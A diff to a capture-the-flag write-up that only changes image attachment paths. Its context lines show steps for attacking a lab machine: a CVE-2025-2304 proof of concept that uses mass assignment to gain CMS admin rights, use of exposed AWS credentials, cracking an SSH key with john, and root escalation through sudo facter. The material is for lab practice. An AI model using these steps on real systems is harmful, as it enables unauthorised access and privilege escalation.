@@ -27,7 +27,7 @@ python3 cve-2025-2304-poc.py http://MACHINE_IP -u low_user -p Password123
 The script sends a crafted POST request to `/admin/users/[ID]/updated_ajax`. Because the backend uses `permit!`, sending `user[role]=admin` overrides the database entry for our session, granting us full Administrative access to the CMS dashboard.
 
 
-![[Pasted image 20260201211310.png]]
+![[../Attachements/Pasted image 20260201211310.png]]
 
 ---
 
@@ -43,7 +43,7 @@ Once logged into the CMS as an **Administrator**, we navigate to the **Media Set
     
 - **Secret Key:** `WJalr...`
 
-![[Screenshot 2026-02-01 210439.png]]
+![[../Attachements/Screenshot 2026-02-01 210439.png]]
 
 Using the `aws-cli`, we list the available buckets:
 
@@ -86,7 +86,7 @@ ssh2john id_ed25519 > id_ed25519.hash
 john --wordlist=/usr/share/wordlists/rockyou.txt id_ed25519.hash
 ```
 
-![[Screenshot 2026-02-01 210510.png]]
+![[../Attachements/Screenshot 2026-02-01 210510.png]]
 `**
 
 ### Step 3: Establishing SSH
@@ -130,7 +130,7 @@ sudo /usr/bin/facter --custom-dir /tmp root_me
 /bin/bash -p
 ```
 
-![[Screenshot 2026-02-01 205316.png]]
+![[../Attachements/Screenshot 2026-02-01 205316.png]]
 ---
 
 
